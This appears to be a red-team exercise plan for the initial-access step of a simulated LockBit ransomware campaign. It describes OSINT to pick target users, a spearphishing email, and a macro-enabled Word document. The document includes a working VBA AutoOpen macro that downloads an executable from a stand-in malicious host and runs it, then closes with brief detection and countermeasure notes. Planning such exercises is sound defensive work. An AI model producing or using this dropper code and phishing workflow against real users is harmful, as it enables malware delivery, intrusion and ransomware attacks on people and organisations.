
# Step 1: Initial Access

**Objective**: Simulate a russian hacker group using a corrupted Lockbit file to move laterally (past firewall), steal sensitive files, and deploy ransomware.

---

## Context

- Target system: `user-workstation subnet` (domain-joined, internal)
- Scenario: Russian hackers that target specific user (OSINT), and find email address to send corrupted docx file.
- Payload type: Lockbit3.0 (docm file w/ VBA script)
- Execution method: Manual execution by using a spearphishing email with corrupted office document after white cell execution. 

---

## Execution


### 1. Finding user-workstation subnet emails to target

- Some kind of OSINT operation (find via ION social media)
- Gather user email addresses in the user-workstation subnet
- Choose a high-privilege or frequently active user

### 2. Build Malicious Word Document

- Insert a VBA script to gain user level access 
- Create a .docm file with an embedded macro payload that writes LockBit executable to disk and runs it:

```
Sub AutoOpen()
  Dim url As String
  url = "http://malicious-cdn.ru/invoice-update.exe"
  Dim objXMLHTTP, objADOStream
  Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
  Set objADOStream = CreateObject("ADODB.Stream")
  objXMLHTTP.Open "GET", url, False
  objXMLHTTP.Send
  If objXMLHTTP.Status = 200 Then
    objADOStream.Open
    objADOStream.Type = 1
    objADOStream.Write objXMLHTTP.ResponseBody
    objADOStream.SaveToFile "C:\Users\Public\invoice-update.exe", 2
    objADOStream.Close
    Shell "C:\Users\Public\invoice-update.exe"
  End If
End Sub
```

### 3. Deliver Phishing Email

- Compose an email that mimics other users on the subnet 
- Attach malware and send

### 4. User Executes Payload

- White cell execution of user clicking email
  - "Editing" malicious document triggers embedded payload

---

## Result

- Gain user level access to user-workstation subnet
- Optional: Find other users to compromise via DMZ Mail Server

---

## Detection Opportunities

| Vector | Description |
|--------|-------------|
| Email gets blocked | Email security filters (e.g., SPF/DKIM, attachment scanning, sandboxing) flag or block the malicious Word document before delivery. |
| Windows recognizes VBA scripts | Microsoft Defender or AMSI detects malicious or obfuscated VBA macro behavior during document execution. |
| Users report as spam? | Users receive suspicious email and report it to IT/security, triggering manual or automated investigation. |

---

## Defensive Countermeasures

- Quarantine/sandbox all email attachments
- Disable office macros